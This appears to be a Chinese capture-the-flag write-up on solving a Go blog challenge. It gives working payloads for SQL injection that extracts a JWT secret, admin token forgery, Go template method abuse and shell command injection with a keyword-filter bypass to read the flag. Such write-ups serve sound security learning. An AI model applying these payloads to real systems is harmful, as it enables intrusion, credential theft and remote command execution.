# gopherblog

## 信息收集

先访问首页和登录页，可以确认是一个 Go 写的博客系统，存在普通用户注册、登录、后台管理和 newsletter 功能。

本地附件是一个 Linux ELF。对二进制做字符串分析后，能看到这些关键信息：

- 路由：`/admin`、`/admin/newsletter`、`/api/posts`、`/api/posts/search`
- 认证：JWT
- 数据库：SQLite
- 关键函数：`main.loadJWTSecret`、`main.newsletterHandler`、`main.checkTemplateContent`
- 关键查询：`SELECT value FROM settings WHERE key = 'jwt_secret'`
- 模板相关：`NewsletterData`、`MailService`、`SiteConfig`

## 漏洞一：`/api/posts/search` 存在 SQL 注入

搜索接口参数 `q` 直接进入 SQL，使用单引号和联合查询即可确认。

### 判断列数

```text
/api/posts/search?q=%25%27%20UNION%20SELECT%201,sqlite_version(),3,4,5,6--%20
```

返回里出现：

```text
"title":"3.45.1","content":"3","author":"4","category":"5"
```

说明有 6 列，且能把回显打到 JSON 里。

### 枚举表

```text
/api/posts/search?q=%25%27%20UNION%20SELECT%201,name,sql,4,5,6%20FROM%20sqlite_master%20WHERE%20type=%27table%27--%20
```

可以得到：

- `posts`
- `users`
- `settings`

### 读取 `settings`

```text
/api/posts/search?q=%25%27%20UNION%20SELECT%201,key,value,4,5,6%20FROM%20settings--%20
```

拿到关键配置：

```text
jwt_secret = 46b2e9fd171214b8d9848117ab61e7a3a9933e8813317f35
```

### 读取用户信息

```text
/api/posts/search?q=%25%27%20UNION%20SELECT%201,username,password,role,5,6%20FROM%20users--%20
```

可以看到 `admin` 用户存在，但这里不需要爆破密码，因为已经拿到了 JWT 密钥。

## 漏洞二：伪造管理员 JWT

普通用户登录后，cookie 为：

```text
token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
```

解码后可以看到 claim 格式：

```json
{
  "exp": 1774578605,
  "iat": 1774492205,
  "role": "user",
  "username": "u1774492204"
}
```

因此直接使用拿到的 `jwt_secret` 重新签一个管理员 token：

```json
{
  "exp": 2000000000,
  "iat": 1774492205,
  "role": "admin",
  "username": "admin"
}
```

伪造出的 token：

```text
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjIwMDAwMDAwMDAsImlhdCI6MTc3NDQ5MjIwNSwicm9sZSI6ImFkbWluIiwidXNlcm5hbWUiOiJhZG1pbiJ9.BOUGBnVIFn3Cm_kF-AbqWiNpVATh8krk6pkpKdeClc4
```

带上这个 cookie 访问 `/admin` 和 `/admin/newsletter` 即可进入后台。

## 漏洞三：newsletter 模板可调用危险对象方法

后台页面提示支持 Go template。向 `/admin/newsletter` 发送：

```text
action=preview
title=test
content=abc
template={{ printf "%#v" . }}
```

可以看到模板上下文：

```text
&main.NewsletterData{
  Title:"test",
  Content:"abc",
  Site:(*main.SiteConfig)(...),
  Mailer:(*main.MailService)(...),
  Date:"March 26, 2026",
  Year:2026
}
```

进一步测试：

```text
{{ .Mailer.Ping }}
```

返回：

```text
nc: getaddrinfo for host "mail.gopherblog.local" port 587: Temporary failure in name resolution
Connection to mail.gopherblog.local:587 failed
```

这说明模板执行时可以直接调用 `MailService` 的方法，而且 `Ping` 内部明显调用了 `nc`。

本地二进制字符串还能看到：

- `main.(*MailService).Configure`
- `main.(*MailService).Ping`

于是继续测试：

```text
{{ .Mailer.Configure "127.0.0.1" 80 }}{{ printf "%+v" .Mailer }}||{{ .Mailer.Ping }}
```

回显：

```text
&{Host:127.0.0.1 Port:80 From:newsletter@gopherblog.local}||Connection to 127.0.0.1:80 failed
```

说明 `Configure(host, port)` 可以修改 `Ping` 使用的目标。

## 漏洞四：`Mailer.Ping` 存在命令注入

直接把 host 改成：

```text
127.0.0.1; id #
```

模板：

```text
{{ .Mailer.Configure "127.0.0.1; id #" 8080 }}{{ .Mailer.Ping }}
```

回显：

```text
nc: missing port number
uid=0(root) gid=0(root) groups=0(root)
```

说明 `Ping` 大概率是类似：

```sh
nc <host> <port>
```

并且 host 没有做安全转义，最终形成了 shell 命令注入。

继续验证：

```text
{{ .Mailer.Configure "127.0.0.1; ls / #" 8080 }}{{ .Mailer.Ping }}
```

回显可见根目录下有：

```text
flag
```

## 读取 flag

由于过滤器会拦一些敏感关键字，例如：

- `readfile`
- `exec`
- `cp`
- `dd`
- `od`
- `$(`

所以直接用 shell 内建读取文件即可。

最终 payload：

```text
{{ .Mailer.Configure "127.0.0.1; set -- /fla?; read x < $1; echo $x #" 8080 }}{{ .Mailer.Ping }}
```

返回：

```text
nc: missing port number
flag{271e005c-8ea3-405a-b78f-e117f560d490}
```

## Flag

```text
flag{271e005c-8ea3-405a-b78f-e117f560d490}
```

## 利用链总结

1. `GET /api/posts/search?q=...` 联合注入
2. 从 `settings` 表读取 `jwt_secret`
3. 伪造 `role=admin` 的 JWT
4. 进入 `/admin/newsletter`
5. 利用 Go template 调用 `.Mailer.Configure` 和 `.Mailer.Ping`
6. 通过 `Ping` 的 shell 命令注入执行系统命令
7. 读取 `/flag`
